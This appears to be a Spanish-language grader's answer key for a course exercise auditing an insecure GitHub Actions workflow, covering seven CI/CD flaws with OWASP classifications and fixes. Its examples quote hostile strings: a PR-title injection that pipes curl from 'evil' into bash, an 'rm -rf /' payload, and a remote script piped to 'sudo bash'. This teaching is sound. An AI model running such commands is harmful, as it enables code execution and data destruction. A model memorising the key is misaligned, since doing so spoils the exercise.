---
ejercicio_id: fase-5/auditar-supply-chain
fase: fase-5
sub_unidad: "5.4"
version: 1
---

> 🚫 **SPOILER — material del corrector.** No mostrar al alumno. Es la auditoría de referencia: úsala
> para detectar qué se le escapó y graduar pistas, **nunca** para entregarle la lista. La clasificación
> OWASP CICD-SEC admite criterios; una categoría distinta bien argumentada es válida.

# Solución de referencia — Auditoría de `workflow-a-auditar.yml`

El workflow contiene **7 fallas distintas**. El DoD pide ≥6, incluido el PPE y el secreto en claro.

## Hallazgos

### 1. Poisoned Pipeline Execution (PPE) — **el más grave**
- **Qué:** `on: pull_request_target` + `actions/checkout` con `ref: ${{ github.event.pull_request.head.ref }}` + el job tiene acceso a `secrets.AWS_SECRET_ACCESS_KEY`.
- **Por qué:** `pull_request_target` corre con los **secrets del repo base** y permisos elevados **incluso para PRs de forks de desconocidos**. Al hacer checkout del código del PR y ejecutarlo (`./deploy.sh`, scripts del repo), un atacante abre un PR que modifica ese código y **ejecuta lo que quiera con tus secrets** (p. ej. exfiltrar `AWS_SECRET_ACCESS_KEY`).
- **Clasificación:** PPE · OWASP **CICD-SEC-04** (Poisoned Pipeline Execution).
- **Severidad:** **crítica/alta** — RCE remoto con credenciales de producción, explotable por cualquiera con una cuenta de GitHub.
- **Arreglo:** para testear PRs de fork usa `pull_request` (sin secrets); si necesitas `pull_request_target`, **no** hagas checkout del código del PR y **no** expongas secrets; separa la lógica que necesita secrets a un workflow disparado tras revisión.

### 2. Privilegio excesivo del token
- **Qué:** `permissions: write-all`.
- **Por qué:** le da al `GITHUB_TOKEN` permiso de escritura sobre todo el repo; si cualquier step se compromete, el daño es máximo (push a ramas, releases, etc.).
- **Clasificación:** permisos · OWASP **CICD-SEC-05** (Insufficient PBAC) / least privilege.
- **Severidad:** media-alta (amplifica cualquier otro hallazgo).
- **Arreglo:** `permissions: contents: read` global; subir permisos puntuales solo en el job que los necesite.

### 3. Action sin pinear (ref mutable)
- **Qué:** `actions/checkout@main`.
- **Por qué:** `@main` es una rama móvil; el código cambia entre runs sin control, y si comprometen la action ejecutas su código nuevo. (Aun un tag sería mutable: caso Trivy, marzo 2026.)
- **Clasificación:** pin/supply chain · OWASP **CICD-SEC-03** (Dependency Chain Abuse).
- **Severidad:** media-alta.
- **Arreglo:** pinear al **SHA** del commit (`actions/checkout@08c6903...  # v5.0.0`).

### 4. Action de tercero no confiable
- **Qué:** `randomdev/super-deploy-action@v1`.
- **Por qué:** action de un autor desconocido/no verificado corriendo en tu pipeline con acceso a tu repo y (en este job) a tus secrets; además sin pinear.
- **Clasificación:** supply chain / uso no gobernado de 3ros · OWASP **CICD-SEC-03**.
- **Severidad:** alta.
- **Arreglo:** preferir actions oficiales (`actions/*`) o de orgs verificadas; si es imprescindible, auditar su código y pinear a SHA.

### 5. Expression / script injection
- **Qué:** `run: echo "Desplegando PR titulado: ${{ github.event.pull_request.title }}"`.
- **Por qué:** el título del PR lo controla el atacante; al interpolarlo en un `run:`, un título como `$(curl evil | bash)` o `"; rm -rf / #` se ejecuta como comando en el shell del runner.
- **Clasificación:** injection / PPE · OWASP **CICD-SEC-04**.
- **Severidad:** alta.
- **Arreglo:** nunca interpolar `${{ github.event.* }}` no confiable dentro de `run:`; pásalo por una variable de entorno (`env:` + `"$TITULO"`), que no es evaluada por el parser de expresiones.

### 6. Ejecución de código remoto sin verificar
- **Qué:** `run: curl -sSL https://get.deploy-tools.example | sudo bash`.
- **Por qué:** descarga y ejecuta (¡como root!) un script remoto no versionado ni verificado; puede cambiar entre runs o servir malware según quién pregunta.
- **Clasificación:** supply chain / ejecución no confiable · OWASP **CICD-SEC-04**.
- **Severidad:** alta.
- **Arreglo:** instalar desde una action pineada o un artefacto con checksum verificado; nunca `curl | bash`, menos con `sudo`.

### 7. Secreto en texto plano
- **Qué:** `PROD_API_KEY: "prod-key-3f9a2b7c1029384756"`.
- **Por qué:** queda en el repo y en el historial de git para siempre; cualquiera que lea el repo lo ve.
- **Clasificación:** secret / credential hygiene · OWASP **CICD-SEC-06** (Insufficient Credential Hygiene).
- **Severidad:** alta.
- **Arreglo:** moverlo a un secret (`${{ secrets.PROD_API_KEY }}`) **y rotarlo** (un secreto que estuvo en claro está comprometido).

## Priorización de referencia

1. **PPE (#1)** primero: mayor impacto (RCE con secrets de prod) × mayor explotabilidad (cualquier externo). Es la falla que regala todo lo demás.
2. **Secreto en claro (#7)**: rotarlo **ya** (está quemado) y moverlo a secrets — arreglo rápido, alto retorno.
3. **Permisos (#2)** y **pin a SHA (#3, #4)**: reducen el radio de daño de cualquier otro fallo; baratos.
4. **Injection (#5)** y **curl|bash (#6)**: cerrar las vías de ejecución no confiable.

El criterio de priorización es **impacto × explotabilidad**, no el orden en el archivo. El que combina acceso a secrets con ejecución de código no confiable (PPE) gana siempre.

## Notas para el corrector

- Acepta clasificaciones CICD-SEC alternativas si están bien argumentadas (p. ej. #4 como CICD-SEC-08 *Ungoverned Usage of 3rd Party Services*).
- La **#5 (injection)** es la más sutil; si el alumno cubrió 6 sin ella, sigue siendo `competente`. Si la encontró, es señal de `excelente`.
- Marca como error grave **mezclar** el secreto en claro (#7, filtración de credencial) con la action sin pinear (#3, supply chain): son superficies distintas.
- Si el alumno no encontró el PPE, ahí va el feedback socrático (no se lo entregues): pregúntale qué deja ejecutar código de un fork con los secrets del repo.
